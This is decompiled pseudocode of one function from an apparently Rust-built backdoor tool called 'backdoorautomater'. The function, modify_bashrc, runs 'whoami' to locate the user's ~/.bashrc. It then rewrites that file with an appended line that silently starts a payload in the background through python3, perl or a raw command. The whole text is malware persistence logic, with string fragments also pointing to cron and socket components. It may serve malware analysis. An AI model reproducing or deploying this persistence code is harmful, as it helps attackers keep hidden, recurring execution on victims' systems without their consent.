
  char const (**)[0x94] backdoorautomater::shellscript::modify_bashrc::h273b1bb4da291c9b(int64_t* arg1, char arg2)

{
    char const (** const var_238)[0x54] = &data_62a890;
    int64_t var_230 = 1;
    int64_t var_228 = 8;
    int128_t var_220 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_238);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        "whoami &\n\nTrying to find the .…", 6);
    int64_t var_158 = var_228;
    int128_t var_168 = var_238;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_238, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_238, 
            "-cFailed to execute commandsrc/s…"), 
        &var_168);
    int128_t var_308;
    std::process::Command::output::hf2f7777b705db8a9(&var_308);
    void var_f0;
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_f0, &var_308);
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_238);
    int64_t var_d0;
    size_t var_c8;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_308, var_d0, var_c8);
    int64_t rax_2;
    uint64_t rdx_4;
    rax_2 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_308);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        rax_2, rdx_4);
    int64_t var_138 = var_228;
    int128_t var_148 = var_238;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_308);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_148);
    int64_t var_e8;
    size_t var_e0;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_308, var_e8, var_e0);
    int64_t rax_4;
    uint64_t rdx_6;
    rax_4 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_308);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        rax_4, rdx_6);
    int64_t var_118 = var_228;
    int128_t var_128 = var_238;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_308);
    int128_t zmm0_3 = var_128;
    var_238 = "/home/perl ";
    char const (** result_1)[0x94] = 6;
    var_228 = zmm0_3;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
    uint64_t var_2f8;
    uint64_t var_278 = var_2f8;
    int128_t var_288 = var_308;
    int64_t r15;
    r15 = 1;
    alloc::str::_$LT$impl$u20$str$GT$::replace::h19a542f01e4bce42(&var_238, *var_288[8], var_2f8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
    int64_t var_278_1 = var_228;
    var_288 = var_238;
    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_288, 
        "/.bashrcpython3 all_cronSocketV4…", 8);
    std::fs::File::open::hc9cc0415293bf7f9(&var_238, &var_288);
    char const (** result)[0x94];
    
    if (!var_238)
    {
        int128_t var_78;
        std::io::buffered::bufreader::BufReader$LT$R$GT$::with_capacity::hfc22a243c8e8e3e1(&var_78, 
            0x2000, *var_238[4]);
        int64_t var_2a0 = 0;
        int64_t var_298_1 = 8;
        int64_t var_290_1 = 0;
        int128_t var_58;
        var_220 = var_58;
        int128_t var_68;
        var_228 = var_68;
        var_238 = var_78;
        int64_t var_240_1 = -0x7fffffffffffffff;
        int64_t* rbx_1;
        size_t* (* rbp_1)(size_t* arg1, void* arg2);
        int128_t* r15_1;
        
        while (true)
        {
            _$LT$std..io..Lines$LT$B$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h114c8ea989dd5339(&var_308, &var_238);
            rbp_1 = var_308;
            
            if (rbp_1 == var_240_1)
            {
                rbx_1 = 1;
                r15_1 = 1;
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_238);
                int64_t var_228_1 = var_278_1;
                var_238 = var_288;
                std::fs::File::create::h8563d56de2c98b4a(&var_308, &var_238);
                
                if (var_308)
                {
                    result = *var_308[8];
                    goto label_46079e;
                }
                
                int32_t fd = *var_308[4];
                int64_t var_2d0;
                int64_t var_2c0;
                int128_t var_2b8;
                int128_t var_268;
                int128_t zmm0_8;
                
                if (arg2 == 1)
                {
                    zmm0_8 = *(arg1 + 8);
                    var_238 = "python3 all_cronSocketV4SocketV6…";
                    int64_t var_230_2 = 8;
                    var_228_1 = zmm0_8;
                    rbx_1 = 1;
                    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
                    var_268 = var_308;
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_268, 
                        " &\n\nTrying to find the .bashrc…", 2);
                    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                        &var_238, "\n\nTrying to find the .bashrc f…", 1);
                    int64_t var_a8_1 = var_228_1;
                    int128_t var_b8 = var_238;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_b8);
                    uint64_t var_228_3 = var_2f8;
                    var_238 = var_268;
                    rbx_1 = 1;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_238);
                    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if (var_2d0 == -0x8000000000000000)
                    {
                        label_460cac:
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        label_460cb1:
                        rbp_1 = 1;
                        goto label_460cc1;
                    }
                    
                    while (true)
                    {
                        int64_t var_2a8_3 = var_2c0;
                        var_2b8 = var_2d0;
                        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(
                            &var_308, "\n\nTrying to find the .bashrc f…", 1);
                        char const (** result_5)[0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                        result = result_5;
                        
                        if (result_5)
                        {
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_308);
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2b8);
                            core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                            break;
                        }
                        
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                        
                        if (var_2d0 == -0x8000000000000000)
                            goto label_460cac;
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    goto label_4605e0;
                }
                
                uint32_t rax_12 = arg2;
                
                if (rax_12 == 2)
                {
                    zmm0_8 = *(arg1 + 8);
                    var_238 = "perl ";
                    int64_t var_230_1 = 5;
                    var_228_1 = zmm0_8;
                    rbx_1 = 1;
                    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
                    var_268 = var_308;
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_268, 
                        " &\n\nTrying to find the .bashrc…", 2);
                    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                        &var_238, "\n\nTrying to find the .bashrc f…", 1);
                    int64_t var_88_1 = var_228_1;
                    int128_t var_98 = var_238;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_98);
                    uint64_t var_228_2 = var_2f8;
                    var_238 = var_268;
                    rbx_1 = 1;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_238);
                    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if (var_2d0 == -0x8000000000000000)
                    {
                        label_460ac8:
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        goto label_460cb1;
                    }
                    
                    while (true)
                    {
                        int64_t var_2a8_2 = var_2c0;
                        var_2b8 = var_2d0;
                        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(
                            &var_308, "\n\nTrying to find the .bashrc f…", 1);
                        char const (** result_4)[0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                        result = result_4;
                        
                        if (result_4)
                        {
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_308);
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2b8);
                            core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                            break;
                        }
                        
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                        
                        if (var_2d0 == -0x8000000000000000)
                            goto label_460ac8;
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    goto label_4605e0;
                }
                
                rbx_1 = 1;
                
                if (rax_12 != 3)
                {
                    rbp_1 = nullptr;
                    label_460cc1:
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    
                    if (!rbp_1)
                        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_2a0);
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_128);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_148);
                    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(
                        &var_f0);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_168);
                    result = nullptr;
                    goto label_460611;
                }
                
                void var_48;
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, arg1);
                alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_48);
                _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                
                if (var_2d0 == -0x8000000000000000)
                {
                    label_4608e4:
                    core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                    goto label_460cb1;
                }
                
                while (true)
                {
                    int64_t var_2a8_1 = var_2c0;
                    var_2b8 = var_2d0;
                    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_308, 
                        "\n\nTrying to find the .bashrc f…", 1);
                    char const (** result_3)[0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                    result = result_3;
                    
                    if (result_3)
                    {
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        break;
                    }
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_308);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_2b8);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if (var_2d0 == -0x8000000000000000)
                        goto label_4608e4;
                }
                
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                goto label_4605e0;
            }
            
            result = *var_308[8];
            
            if (rbp_1 == -0x8000000000000000)
                break;
            
            size_t* (* var_108)(size_t* arg1, void* arg2) = rbp_1;
            char const (** result_2)[0x94] = result;
            uint64_t var_f8_1 = var_2f8;
            alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_108);
        }
        
        rbx_1 = 1;
        r15_1 = 1;
        core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_238);
        r15_1 = 1;
        label_46079e:
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_2a0);
        
        if (rbp_1 != var_240_1)
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
    }
    else
    {
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
    }
    
    label_4605e0:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_f0);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
    label_460611:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
